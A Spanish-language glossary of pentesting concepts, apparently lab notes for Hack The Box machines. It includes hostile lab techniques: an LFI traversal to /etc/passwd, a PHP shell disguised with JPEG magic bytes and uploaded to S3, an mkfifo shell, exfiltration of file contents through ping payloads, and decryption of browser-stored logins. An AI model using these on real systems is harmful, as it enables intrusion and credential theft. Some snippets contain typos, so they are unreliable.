---
layout: default
---
<h1>./issk.sh 2>/dev/null &;disown</h1>
## Apuntes: Conceptos varios
----------------------------------------------------

## ARPANET

ARPANET fue una red de computadoras creada por encargo del Departamento de Defensa de los Estados Unidos (DOD) 
para utilizarla como medio de comunicación entre las diferentes instituciones académicas y estatales.

## ASLR

Es un tipo de protección  que hace variar las direcciones de la memoria
de un programa en un sistema. Para comprobar el ASLR en el sistema recurrimos a cierta ruta

/proc/sys/kernel/randomize_va_space 

#Si este archivo contiene un dos el ASLR sera dinamico y lo podras comprobar de la siguiente manera
```bash
for i in $(seq 1 1000); do  ldd binary ; done
```
Te iran cambiando las direcciones.
Si lo cambias a un 0 lo vuelves estático

## AWS

Amazon Web Services (AWS) es la plataforma en la nube más adoptada y completa en el 
mundo, que ofrece más de 200 servicios integrales de centros de datos. 

AWScli es una herramienta que sirve para administrar las páginas que 
utilizen este servicio, para identificar una de estas páginas 
tienes que fijarte en que el dominio tengo s3. 

Usaremos una herramienta llamada aws del paquete awscli

Crearemos una cuenta aws con:

```bash
aws configure

#Asi veremos el directorio que esta filtrando todo el contenido de aws

aws --endpoint-url http://s3.bucket.htb s3 ls 

#asi veremos el contenido del directorio

aws --endpoint-url http://s3.bucket.htb s3 ls s3://adserver 

#asi subiremos un archivo a la web

aws --endpoint-url http://s3.bucket.htb s3 cp shell.php s3://adserver/shell.php

#para ver las tablas que tiene

aws dynamodb  list-table --endpoint-url http://s3.bucket.htb

#PARA VER EL CONTENIDO DE LA TABLA 

aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb 

#Crear una tabla # IMPORTANTE

 aws --endpoint-url http://s3.bucket.htb dynamodb create-table \

--table-name alerts  --attribute-definitions AttributeName=title,AttributeType=S \ 
--key-schema AttributeName=title,KeyType=HASH \ 
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5

#subir un item a la tabla , aunque luego lo mismo tendremos que usar un curl -d para especificar parametro

aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item file://ransomware.json

#curl -X POST -d "action=get_alerts" http://localhost:8000 -v #En caso de que el parametro sea action

#PREVIAMENTE TENDREMOS QUE HABER HECHO LOCAL PORT FORWARDIN PARA VER DESDE EL NAVEGADOR EL SERVICIO Y
#BUSCAR LO QUE HEMOS SUBIDO.
```

## bufferOverflow

Es el desbordamiento del buffer de un programa, más bien cuando un programa
es superado por el contenido que le has dado a realizar este interpretado
en la memoria, se desplaza hasta sobrepasar los resgistros que le corresponden
y sobreescribir registros como el eip.

Tiene relación directa con el debugging ya que el debugging es la técnica
para arreglar ("depurar") un programa. Haciendo variaciones en el código
a bajo nivel para modificar los registros.

## Codigos de estado

429 -- bloqueo por exceso de peticion, wfuzz usa -s para delay

302,301 Redirecciones

404 error, por not found

200 codigo de exito OK

401 unauthorized

500,501,502 internal server error

## Convencion de llamada

En un kernel de 64 bits con sus respectivas aplicaciones hay 
un concepto muy importante que aprender, los registros tiene 
nombres y tamaños distintos a los de 32 bits y
son denominados como convencion de llamada, los cueales son
las siguientes: `rdi rsi rdx rcx r8 r9` →→ Estas direcciones
son mas grandes que las de 32 bits.

## Crear servicio

basicamente creas un archivo que se llame loquesea.service
Con la siguiente estructura.

```systemd
[Unit]
Description="Hola soy la descripcion puede ser lo que sea"

[Service]
Type=oneshot
ExecStart=whoami

[Install]
WantedBy=multi-user.target
```

#Por ultimo lo iniciaremos con: 
```bash
systemctl link /home/caasi/loquesea.service

systemctl enable --now loquesea.service
```
## Crear funciones Curl y Wget

En caso de que no puedas transferir los archivos entre maquinas podemos
crear una funcion wget y curl. Seran como el propio comando, puedes ponarlas
directamente en la terminal o crear un script.

```bash
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```
```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```
## DEBUG

Debug es un parametro especial en las url, en muchos casos
te lo muestran en algún comentario, si lo ves en un comentario 
del código fuente, o de la página, prueba a ponerlo en la url 
aunque sea una /?debug=dneodenj  la gracia es ponerle un valor 
cuando vulves a donde estaba el comentario debug te mostrara 
otro contenido.

Esto ocurre porque se suele implementar para dar una respuesta
distinta, en un testeo por el admin y no se acuerda de borrarlo
en muchos casos tras añadir este parametro con un valor cualquiera
te habilita mandar data en el parametro que interprete el php.
Incluso añadir funciones.


## Bypassear funciones deshabilitada de PHP.

Hay varias maneras de bypasear una funcion desabilitada en php
con que nos referimos con esto, basicamente a que si el servidor
victima ha bloqueado el uso de una función asi como puede ser 
system o passthru, podemos bypasearlo creando una función con 
el nombre que queramos o con codificaciones, la mejor opcion es 
crear una funcion con el nombre que queramos.

En su repositorio hay un exploit.php que basicamente es un archivo
en el cual crea una función llamada pwn y tu puedes ponerle el contenido
arriba donde pone uname

[https://github.com/mm0r1/exploits](https://github.com/mm0r1/exploits )
#Te saldran 4 archivos y según la version del php uno de ellos te funcionara 

Author: [https://github.com/mm0r1](https://github.com/mm0r1)


## Byte nulo

Es una manera de cortar toda la información que prosigue, en unvio de data.

http://10.10.10.62:4/index.php?page=home

Esto apunta a home y podemos probar 

http://10.10.10.62:4/home.php

Hasta aquí todo normal, pero en caso de que se este dando un lfi

http://10.10.10.62:4/index.php?page=../../../../etc/passwd 

Es muy probable que evada este lfi si no le añadimos un byte nulo, por la simple razon
de que el servidor es muy probable que este juntando "home" + ".php" de tal manera hará
passwd.php y no queremos eso.

Solucion:
http://10.10.10.62:4/index.php?page=../../:./etc/passwd%00



## docker

Primero iniciamos el demonio de docker 
`dockerd` 

`docker images`

creamos una imagen de ubuntu 

FROM ubuntu:18.04
#Esto lo pondriamos en un archivo llamado Dockerfile

#Tras esto crearemos un contenedor

`docker ps` 

#Podremos ver los contenedores que tenemos.

#Creamos uno: 

`docker run -dit --network bridge --name application ubuntu`

-d = Segundo plano

-it = modo interactivo

--network = es el tipo de red 192... 10...  (nat,puente etc)

--name = nombre que le pondras al identificador y por ultimo la imagen

#Ahora que ya esta creado podemos desplegarlo asi

`docker exec -it application bash`

`docker stop application`

#para cerrar el contenedor.

#Tienes que cerrarlo bien asi que para eso fijate en si queda algun identificador con:

`docker ps -a -q`

#En caso de que si usa

`docker rm $(docker ps -a -q)`

#con esto borras el identificador, pero el identificador podemos ponerlo a nivel de sistema, con el anterior comando

Cuando añadas algo al archivo de Dockerfile como comandos al sistema operativo tendremos que actualizar la imagen

para esto tendremos que cargar otra vez docker build . -t ubuntu.

Puede que se te cree una imagen dañina para ver el identificador de esta imagen tienes que utilizar 

`docker images --filter="dangling=true" -q`

Con esto listamos la imagen dañina y la eliminamos con esto: 

`docker rmi $(docker images --filter="dangling=true" -q)`


`docker run --rm -v /:/mnt -it ExampleImage bash`

-v es para crear monturas de la / de la maquina actual a /mnt del conte 

**Dockerfile:**

```Dockerfile
FROM ubuntu:18.04
MAINTAINER caasi <caasi@gmail.com>
ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update && apt-get install -y git \
	net-tools \ 
	iputils-ping
 
WORKDIR /opt

#Esto es para que iniciemos desde este directorio
```
## ECC

criptografia de curva eliptica 
Es un tipo de criptografia que se puede romper con el modulo secure de python.
para saber cuando tienes que utilzar este tipo de criptografia el objetivo tiene
que se una cadena que parezca estar en hexadecimal o en formato offset
Nos importamos el modulo seccure 
```python
import seccure 
cypher = seccure.decrypt(b"""cadena hexadecimal""", b'key publica')
```
Los sistemas de criptografía asimétrica o de clave pública utilizan dos claves
 distintas: una de ellas puede ser pública, la otra es privada.
La posesión de la clave pública nos proporciona suficiente información 
para determinar cuál es la clave privada. 

## encfs

Es un tipo de encriptado que se hace a los directorios cuando se le 
añade el archivo oculto .encfs6.xml , los archivos de este directorio 
tendran como nombre un cifrado y no se podra acceder a ellos.

Existe una herramienta para romperlos esta es enfs2john le pasamos el
directorio y luego lo craqueamos.

Luego existe una herramienta llamada encfs para pasarle la autenticacion
al directorio, lo clona y en la clonacion estan todos los archivos desencriptados.
lo unico es que hay que pasarle la ruta absoluta.
encfs /home/issk/Escritorio/vault /home/issk/Escritorio/pepito

## env

env es un comando del sistema operativo Unix y los sistemas Unix-like.
Es usado para mostrar una lista de las variables de entorno y para 
ejecutar otro programa con las variables de entorno modificadas sin 
tener que modificar las variables de entorno del equipo. 
Usando el comando env se pueden añadir y eliminar variables, además 
de poder modificar el valor de las variables actuales.


* tambien podemos ejecutar comandos con:

`env ls`
`env python`

## epoch

Es una variable en una cadena de json web tokens que se representa con 
{"exp":"12323132"} representa el tiempo para una validacion de esta cadena
que se utilizará como cookie session.


## FQDN

Un FQDN es un nombre de dominio completo que incluye el nombre de la computadora 
y el nombre de dominio asociado a ese equipo.​​ Por ejemplo, dada la computadora 
lla mada «serv1» y el nombre de dominio «bar.com.», el FQDN será «serv1.bar.com.»
; a su vez, un FQDN asociado a serv1 podría ser «post.serv1.bar.com.».

Las ips podrian ser distintas a la ip original, en caso de que esto se este 
ejecutando bajo un proxy pordriamos acceder al archivo de configuracion 

```bash
curl -s -X GET http://10.10.10.10/squid-internal-mgr/fqdncache -u ':password1'
``` 
#No hace falta poner usuario. ASI nos autenticampos para poder verlo, 
#todo esto es que caso de que te pida pass

## Generarar un gift "cli"

Generar un gift con muy buena caldiad es muy sencillon, si
seguimos una serie de pasos. 
LOS MEJORES!!!!

```bash
ffmpeg -i video.mp4  -r 1 'frame-%03d.png'

#Usamos ImageMagick para crear el gif animado. Hay que ajustar el valor de delay (más alto=más lento). Un valor 50 es 0.5 segundo

convert -delay 50 -loop 0 *.png myimage.gif

#Se puede optimizar el git

convert myimage.gif -fuzz 5% -layers Optimize optimised.gif
```

## Gestores de inicio de sesion

lightDM
gm3
LXDm
SDDM
MDM

## gopher

Gopher es un servicio de Internet consistente en el acceso a la información a través de menús. 
La información se organiza en forma de árbol: sólo los nodos contienen menús de acceso a otros 
menús o a hojas, mientras que las hojas contienen simplemente información textual. En cierto modo 
es considerado un predecesor de la Web, aunque sólo se permiten enlaces desde nodos-menús hasta 
otros nodos-menús o a hojas, y las hojas no tienen ningún tipo de hiperenlaces. 

Es muy util para hacer busquedas de archivos desde la web y considerado un wrapper en casos como
el de SSRF con phpmemcachet, convierte la data en php. Para usar este wrapper hacemos uso de 
herramientas como gopherus, tener en cuenta esto último de porder atacar al memcatched.

## GPG

Gnu privacy Guard 
de cifrado y firmas digitales desarrollado por Werner Koch, que viene a ser un reemplazo del PGP pero con la principal 
diferencia que es software libre licenciado bajo la GPL

## GPL

Gnu general public license Es una licencia 
de linux que te permite compartir, distribuir
y hacer lo que quieras con la aplicacion que 
tenga esta licencia.

## htpasswd

Es un comando que te permite crear archivos con nombres de usuarios y contraseñas
del servidor esta siempre oculto.
Diferente al htaccess

## hurricane

Es una pagina web hurricane electric que te permite ver la ip publica de 
la maquina al igual que su busqueda whois y realiza resolucion de nombre
de dominio. 

## IANA

La coordinación global de la raíz del DNS, el direccionamiento IP, y otros recursos del protocolo de Internet se 
realiza como Funciones de la Autoridad de Números Asignados de Internet (IANA)

## ICANN

La IANA (Autoridad de Números Asignados en Internet), es un departamento que supervisa la asignación de las IPs a nivel mundial.
La IANA pertenece a la ICANN (Internet Corporation for Assigned Names and Numbers), encargada de la administración y organización
del espacio de nombres de dominio de Internet, es decir, de asignar www.losteatinos.com.


## IoT

Internet of things 
Es el termino que utilizamos para referirnos a la red de comunicacion que 
se establece entre todo tipo de dispositivo que pueda conectarse a otro. 
Esto no solo incluye moviles, tables, o equipos infomaticos, tambien estamos
hablando de cualquier equipo electronico que pueda conectarse comunicarse 
como puede llegar a ser un microondas o un semaforo.

El internet of things tiene como finalidad estudiar el funcionamiento de estos
dispositivos para para mejorar si funcionamiento. 

## IP2Hex

Para bypasear los puntos de una ip porque no te los permite poner pueedes
poner la ip en hexadecimal
pasas todos los numeros a hexadecimal y quitas las x menos las primeras
dejandolo en formato como este: 0x7f000001

## ipv6

Cualquier adaptador de red con IPv6 que se esté usando para tráfico de Internet, siempre 
debe tener dos direcciones IP: su dirección link-local y su dirección global unicast.

Su dirección global unicast es enrutable a nivel mundial, por lo que cualquier persona en 
cualquier parte del mundo puede ver esa dirección IP (aunque, por supuesto, debería haber 
un firewall para evitar que realmente accedan a su red).

Su dirección link-local es solo para su red de área local. Considérelo el equivalente 
de una dirección 192.168.0.1 o 10.1.1.1. No son enrutables, y pueden usarse para 
comunicaciones internas, de modo que si su prefijo enrutable a nivel mundial cambia, 
no tiene que actualizar todas sus referencias de IP a direcciones IP internas.


## JWT

Es una manera segura entre muchas comillas de tramitar una cookie 
se basa en tres valores los dos primeros se decodifican con base64 
y el ultimo simpre es un valor random que haiga añadido el servidor
lo suyo es saber lo que te pide este valor, puede ser una clave privada 
o cualquier otra cosa. También puedes cambiar los valores del base64 
para luego tramitar tu promia cookie acorde a lo que quieras cambiar.

## kitty

Es un tipo de terminal que te permite maniobrar de muchas maneras
una implementacion que  tiene esque mediante el comando de kitty 
podemos visualizar imagenes desde la terminal.

`kitty +kitten icat imagen.jpg`

## krb5

kerberos esta por defecto en los puertos 88

Si quieres acceder a un dominio con kerberos tienes que definir 
lo siguiente en el archivo de configurarcion /etc/krb5.conf
pero claro esto tiene que tener los valores del propio equipo.


```conf
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
        REALCORP.HTB = {
                kdc = 10.10.10.224
        }

[domain_realm]
        srv01.realcorp.htb = REALCORP.HTB
```
## launchpad

Es una manera de hacer una busqueda del sistema operativo victima 
y consiste en coger la version completa del ssh al hacer el escaneo 
y pegarla en el browser con la palabra clave launchpad.

## libreoffice

Libreoffice puede encriptar sus campos, tanto columnas como filas, pero 
de poco vale porque si tienes el fichero y le pasas 7z l puedes ver como
estos archivos realmente con comprimidos todos, con lo cual si los descomprimes
se generaran unos cuantos archivos y uno de ellos mantiene las credenciales 
en algunos casos esta hasheada. Puedes filtrar con grep por prot  de proteccion.

le quitas esa etiqueta que almacene la proteccion hasheada y vuelven a comprimir 
los archivos `zip -r archivio.xlst *`. Ya no tendria contraseña tambien existe un 
archivo que te lista las credenciales en texto plano.

## littleEndian

Esto pasa cuando la escritura de los bytes cambiar el orden
de derecha a izquierda y viceversa , segun el formato en el
que se almacenan los datos , por ejemplo: la diferencia entre
un archivo de 64bits y otro de 32.


Hay una libreria llamada struct de la que puedes escoger una 
variable llamada pack , esto automaticamanete te lo pone en 
formato little Endian .

```python
from struck import pack
```
## lshell

limited shell 
es una shell limitada como rbash.

## MagicNumber

Un número mágico en informática se refiere a unos caracteres alfanuméricos que de manera 
codificada identifican un archivo, generalmente ubicados al comenzar dicho archivo. 
Su uso está extendido en entornos asociados con Unix y sus derivados, como método alternativo 
de identificación.

Para cambiar el cotenido del archivo que sea aun interpretable por no cambiar el formato de 
los numeros magicos lo que haremos es usar esto:

```bash
head -c 
-c #Caracteres de magic number (cantidad)

head -c 20 hola.jpeg > test

cat test shell.php > shell.php

#Ahora tendriamos un archivo con el contenido de una shell php identificado como jpeg.
```
También para manipular el contenido podemos simplemente meter el codigo php dentro del archivo.

## mkfifo
```bash
mkfifo input; tail -f input | /bin/sh 2>&1 > output
```
Creamos el fichero especial input y mostramos las últimas lineas con -f le especificamos
que muestre mientras el archivo crece por ultimo enviamos el stederr al stdout por un 
archivo output con este oneliner comunicariamos el flujo del programa input en output 
si yo envio echo "whoami" > input el comando final se refleja en output.

mkfifo  construye  un  fichero  especial  FIFO  con el nombre camino.  modo especifica los
permisos del FIFO. Son modificados por la máscara umask del proceso de la forma  habitual:
los permisos del fichero recién creado son (modo & ~umask).

Un  fichero especial FIFO es similar a una interconexión o tubería, excepto en que se crea
de una forma distinta. En vez de ser  un  canal  de  comunicaciones  anónimo,  un  fichero
especial FIFO se mete en el sistema de ficheros mediante una llamada a mkfifo.

## mount

Como ya sabemos mount es un comando para crear monturas

#tips

`cat /etc/exports`

En caso de que tenga monturas desde el servidor existe una ruta para ganar mas
informacion sobre las que se estan compartiendo con el cliente.
En las monturas con otros equipos tenemos que tener en cuenta de que aunque la haigamos
hecho en nuestra propia maquina nosotros somos otros.

Con lo cual también es muy importante fijarte el grupos de la montura.

## mozillaYgoogle

Firefox y thunderbid tiene un archivo oculto llamado .mozilla o .thunderbird
que contiene información almacenada por el usuario es un directorio en el que guardas información.
#Suelen exister dos archivos en el directorio que tienes que desencriptar
key4.db
logins.json
#Herramieta a usar es firepwd de github; la herramienta se usa simplemente ejecutandola con lso archivos en el directorio


google-authentificator
Es otro archivo que oculta un codigo en su interior y para poder 
verlo tenemos que hcaer uso de oathtool, esta herramienta te permitira
poder ver el codigo de la siguiente manera
`oathtool -b @file`
#Este codigo siempre esta rotando lo que lo hace cambiar suele ser la hora
#con lo cual tienes que cambiar la hora con date -s "2/15/2021 21:21:21"
Fijate CET AMT dependiendo de europa o otra zona.

## no-ip

El no ip es un tipo de configuracion que puedes utilizar si utilizas
una dirección ip publica dinamica, en este tipo de configuración las
ips cambiantes se van a traducir a el nombre del host que le haigas 
añadido. 
De tal manera que podras acceder desde cualquier sitio sin tener que 
memorizar un numerito que va cambiando. Y como dato importante se 
genera un dominio con el subdominio del hostname y terminado en no-ip
Ej:

dynst.no-ip.htb

## DataExecutionPrevention "NX/DEP"

En los archivos compilados (binarios) o ejecutables dinamicos
basicamente podemos ver si el DataExecutionPrevention esta 
habilitado utilizando la herramienta checksec --file=

En esta parte te saldrá si esta enable o no en caso de estar enable
significa que nosotros no podremos 
maniobrar sobre la pila en la memoria del ejecutable.

NX enabled
(concretamente en la pila)

## ntds

Los archivos ntds .dit son archivos que han sido almacenados por una base de datos 
que contienen informacion de los usuarios , para conseguir esta informacion usaremos
una herramienta que extraera los hashes de dos archivos un .dit y otro .bin para 
posteriormente ser crackeados.

## oauth2

Este es un servicio que para su funcionamiento o logeo
necesita de una serie de parametros. 

grant_type= (tiene que ser autorizado)

code = el code se saca con el client_id, este client_id sera de alguna aplicacion

grant_type=authorization_code&code=1jZKRQ5R5h8mPO3vnhhZSGxo7KQJJU&client_id=nzxgxDxmetzHCBxJZqJcllXyarGsaIewgiK09MAn

oauth suele trabajar con django que puede ser el framework en el que se este usando la application
django tiene una zona de register http://authorization.oouch.htb:8000/oauth/applications/register

Para encontrar todos estos parametros tienes que hacer ciertas peticiones en la web 
y ir guardando los resultados de los parametros.

OAuth 2.0 es un estándar abierto para la autorización de APIs, que nos permite 
compartir información entre sitios sin tener que compartir la identidad. 
Es un mecanismo utilizado a día de hoy por grandes compañías como Google, Facebook, 
Microsoft, Twitter, GitHub o LinkedIn, entre otras muchas.

## openvpn

Es una herramienta para hacer conexiones a vpns pero 
se tiene que tener en cuenta que en la esttructura de los archivos 
ovpn tienen en la parte principal ya hostname correspondiente al
nombre del dominio, evidentemente tenemos que tener conexion con
ese dominio. Para que esto funcione.
Estos archivos suelen utilizar el cifrado por bloques 
aes256cbc 

En algunos archivos ovpn tienen definido user y group, esto hace
referencia un usuario y un grupo de tu sistema los tienes que tener 
si no los tienes simplemente cambia el contenido del archivo ovpn por dos
grupos existentes, si no haces esto te dara un error. Suele darse el
usuario que todos tienen nobody.

## os

Es una libreria muy importante de python que hace una llamada al
sistema, de tal manera que te permite ejecutar comandos en bash

```python
import os
os.system("whoami")
```
#En caso de que cuando ejecutes un comando te salga el codigo de estado, o otra cosa podemo susar os.popen
#para ver el comando bien en texto plano.

## OTP

Una contraseña de un solo uso u OTP (del inglés One-Time Password) 
es una contraseña que pierde su validez después de su uso, de ahí 
su denominación. Por lo general, se emplea como parte de una 
autenticación de doble factor.1​ La OTP soluciona una serie de 
deficiencias que se asocian con una contraseña tradicional (estática).

Este sistema se basa en generar tokens aleatorios que desaparecen
en un corto perido de tiempo.

Es probable que cuando este, este factor en una pagina web tambien
haga uso de TOPT que es una fucionalidad para que el token que le 
envies solo sea valido si teneis el servidor y el cliente la misma
hora. Existen varias utilidades para ver la hora del servidor como 
utilizar curl -I para ver sus cabeceras, de esta manera ves la
cabecera date que te indica su hora.

Puede que para hacer ese cambio de hora en el servidor este implementando
ntp, que es un protocolo que te indica tambien la diferencia de hora
entre tu y el servidor si te sincronizas con el protocolo ya estaras
sincronizado con el servidor.

Si hacemos uso de las librerias de python pyotp y ntplib 
```python
#!/usr/bin/python3
import pyotp
import ntplib 
from time import ctime
client = ntplib.NTPClient()
response = client.request("10.10.10.246")
response 
##En este momento ya estariamos sincronizados con el servidor 
dir(response)  
##Te muestra todos lso atributos y hay uno importante que es tx_time
ctime(response.tx_time)
#Thu Apr 28 01:39:37 2022'
## Es para ver la hora actual del servidor, ahora pasaremos a generar el token valido.
totp = pyotp.TOTP("orxxi4c7orxwwzlo")
### Le pasamso el token que se filtro ya caducado pero es para que sepa como computar uno nuevo.
print(totp.at(response.tx_time))
### imprime el token actual. para la hora que le pasamos, pero si pasa el tiempo se genera otro. 
```
Simpre que este jugando con tecnologia otp y quieras enviar el token
que corresponde, tienes que tener la hora sincronizada con la maquina vitima
di no este no te funcionara, en muchso casos es sencillo porque la maquina victima
tiene abierto el puerto de ntp, y podemos sincronizarlo mediante un script pero
en otros casos tendremos que cambiar nuestra propia hora con date



## PDO

#En caso de no poder acceder a la herramienta mysql o psql del sistema creamos este script en php interactive
```php
php > $conection = new PDO('pgsql:dbname=profiles;host=localhost', 'profiles', 'profiles')
php > $connect = $conection->query('select * from profiles');
php > $result = connect->fetchAll();
print_r($result);
``` 
## Peticiones WEB "Metodos"

Existen varios metodos web pero los más utilizadas son POST Y GET
una peticion GET te muestra tal como es la pagina web mientras que en una peticion 
POST te muestra contenido oculto en la pagina. También es la peticion más utilizada
para el envio de datos con curl -d "" puedes concretar los datos que quieres enviar
en caso de que en esa página se este dando una petición post es muy probable que en 
la url esten definidos ciertos parametros.

## PGP

Pretty Good Privacy (PGP) es un programa creado por Phil Zimmermann que nos ayuda a proteger nuestra privacidad, 
para que todas las comunicaciones estén a buen seguro; al mismo tiempo, garantiza la autenticidad de los mensajes 
electrónicos que enviamos.

## Ping Local File Inclusion

Existe una técnica que te permite mediante un ping 
poder ver los archivos de la maquina victima, 
para ello tienes que conseguior ejecucion remota de comandos
esta tecnica se suele utilizar cuando no hemos conseguido una reverse shell

`pip3 install scapy`

```bash
xxd -p -c4 /etc/hosts | while read line ; do ping -c1 -p $line 127.0.0.1 ; done
#Convertimos el contenido de dicho archivo en hexadecimal y plaintext, para que no salga mucho output lo dividimos en cuatro caracteres for fila.
#Hacemos un bucle con ese contenido
#Y ese bucle se lo pasamos en forma de variable a ping, con le parametro -p cremos un patron en ping.
#Se podra ver el patron para cada cadena en hexadecimal. si lo capturamos con wireshark vemos como se en cada pattern capturado se encuentra la informacion del archivo.
#Pasamos al script de ejemplo
```
**capturamos ese bucle con:**

```bash
tcpdump -i lo -w captura.cap -v
```
**Script explicativo**
```python
#!/usr/bin/python3
from scapy.all import *
packets = rdpcap("captura.cap")
#Para almacenar la info de los archivos.cap rdpcap
#En esa captura esta una cantidad de paquetes y tenemos que iterar entre ellos filtrando por lo que nos interese, esto se basa en eso.
for packet in packets:
	print(packet)
#Te mostrara todos los paquetes pero si abusas del indice
packets[1] #Solo te mostrar ese paquete
packets[1][ICMP] #filtramos por el contenido ICMP 
#Aqui entra el concepto layer o capa, estan dividido por |< y podemos filtrar por ellos.
#Lo que estamos usando arriba [ICMP] es un layer
podemos listar con ls
ls(packets[1][ICMP])
#Y el campo que finalmente nos interesa es load. 
packets[1][ICMP].load 
#La info va de dos en dos. Se te muestra en estructura de 4 bytes 
#y estos 4 bytes almacenan la informacion de dos en dos.
packets[1][ICMP].type #Para mostrarnos el tipo tambien es importante al filtar.
packets[1][ICMP].load[-4:] #Nos quedamos con los ultimos 4 bytes
```
**SCRIPT REAL no es necesario el indice en los paquetes en este.**

```python
#!/usr/bin/python3
from scapy.all import *
import sys, signal
#Una manera de solo capturar ICMP packets[0].haslayer(ICMP)
#Construimos un sniffer
def def_handler(frame, sig):
	print("\nSaliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def funcion_data(packet):
	if packet.haslayer(ICMP): #Si del paquete entrante detecto que es ICMP muestramelo
		if packet[ICMP].type == 8:
			data  = packet[ICMP].load[-4:].decode("utf-8")
				print(data, flush=True, end='') #Flush y end es para quitar los saltos de linea.
if __name__ == '__main__':
	sniff(iface='tun0', prn=funcion_data)
#Con sniff nos ponemos a la escucha por dicha interfaz
#Lanzamos la traza icmp xxd desde el RCE
```

## Port Knock

El demonio de knock es un proceso que oculta un puerto o cierra este puerto con tal de
que los atacantes no puedan identificarlo en un escaneo , este se queda a la escuicha de 
una secuencia prestablecida para abrir este puerto.


El golpeo de puertos consiste en abrir un puerto en una maquina victima mediante una 
secuencia prestablecida en el archivo /etc/knockd.conf 

Existe un script muy bueno para ejecutar la secuencia llamado knock de grongor en github
o también puedes usar el mio. [Mi primer script en github](https://github.com/ISSKsec/Knock/blob/main/script.sh)

También lo podemos hacer con bash scripting asi :

```bash
for x in 442 233 321 ; do nmap -Pn --max-retries 0 -p $x 10.10.10.10 ; done
```

#Tras esto el puerto que estubiera cerrando el demonio, se abre

## pseudoconsola

Una seudo consola o consola interactiva te permite maniobrar con shortcuts y 
ademas se visualiza en el prompt cuando usas aplicaciones interactivas como mysql
```bash
script /dev/null -c bash
^Z
stty raw -echo
reset

python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

#Alternativa
export TERM=screen-256color
after ^Z 
export TERM=screen

#Tambien podemos usar perl y muchos otros lenguajes de programacion para hacer esto. 
#He mencionado la de perl porque también es muy fiable.
```
## pypirc

Es un archivo que comunica tu maquina con otro servidor , pero esto
significa que hay un script en python que esta mandando cierto codigo
y se comunica con este para buscar su target.

## QUIC

QUIC es un protocolo de red experimental sobre la capa de transporte 
diseñado por Jim Roskind en Google, inicialmente implantado en 2012, 
y anunciado como experimento ampliado en 2013.

En pocas palabras es la implementacion del protocolo TLS a UDP otro 
protocolo que quiere decir que por ejemplo paginas https 443 sean 
cargadas desde udp, tambien se piensa implementar el protocolo HTTP/3 
a UDP mediante este estandar quic


## quipquip

Es una pagina web que descifra piezas de texto.

RainbowTables

Es una tecnica de crackeo de hash de forma instantanea, el funcionamiento
es sencillo mediante una wordlists con los hashes y su respectivo descifrado
en texto plano, cuando tu le pasas una hash es capaz de hacer un filtro 
rápido por el hash y así conseguir rapidamente tu contraseña en texto plano.
Esta funcion la usa la página [Crackstation](https://crackstation.net/).

## rbash

restringed shell

No puedes usar los comando que esten bloqueados, 
para salir de esta rbash tendremos que añadir bash
al final de la entrada.

ssh mindy@10.10.10.10 bash  

sh

## ReleaseNotes

Una manera para identificar la falla o vulnerabilidad de una pagina web 
es buscar release notes del servicio que usa, obviamente sabiendo la version
y asi te situas, si es una versión antigua o hay mas versiones nuevas es 
mas probable que sea vulnerable a si es una version no tan antigua.

## ReverseShell

Una reverse shell es una consola que generamos en nuestro equipo que 
pertenece a un equipo remoto, de tal manera que podemos ejecutar comandos
desde nuestro equipo local como si estubieramos en el otro equipo, estas 
reverse shell se pueden generar de muchas maneras pero por lo general es 
por ejecucion de comandos, ya sea usando un interprete de programacion o 
otra shell. Hay dos vias de conexion UDP y TCP lo normal es tcp pero para
poder generar una reverse shell UDP existen aplicaciones especificas así 
como nc y su parametro -u #Tanto en el ataque como en la escucha

## Reversing

**REVERSING**
	
El reversing es el estudio del código de un programa con la intencion de
entender el comportamiento de este mismo.

En caso de utilizar peda para reversing, tenemos que ver lo que se esconde en 
las direcciones cuando haces un run. Utilizariamos breakpoints lo normal
siempre es empezar con el brakpoint de main.
```bash
b *main 

#Abajo te saldra el breakpoint de main "direccion"

r #Para ver lo que se esta ejecutando
```
Ahora estariamos hubicados en main, si por ejemplo estubieramos
en ghidra te diria las funciones que hay dentro de main y si las 
pinchas en la ventana del medio sale la dirección offset sabiendo
esto volveriamos a peda y solo tendriamos que cambiar los tres ultimos
caracteres del breakpoint 
```bash
0x4505410245d 
#main

c #continuar para ver en la nueva direccion


b *0x4505410273f 

#Aqui cambiamos los tres últimos y asi nos movemos a otra parte de la memoria para ver lo que hay pero recuerda que seguimos en main
```
En reversing los campos importantes "direcciones" es donde se producen
las interacciones como insertar las password: o donde tengamos que poner un parametro

#Otra tecnica de reversing

En caso de darnos cuenta de que existe una funcion que no es main y
que puede contener informacion valiosa, la metodologia es parecida
primero pasamos por main le damos run, si todavia no nos esta preguntando
nada la app ara intrducir le damos c para llegar a esa parte y cuando
llegamos Control C para salir de esa parte.
Hay es cuando podemos saltar a la otra funcion que queremos ver.
```bash
b *main
r
c
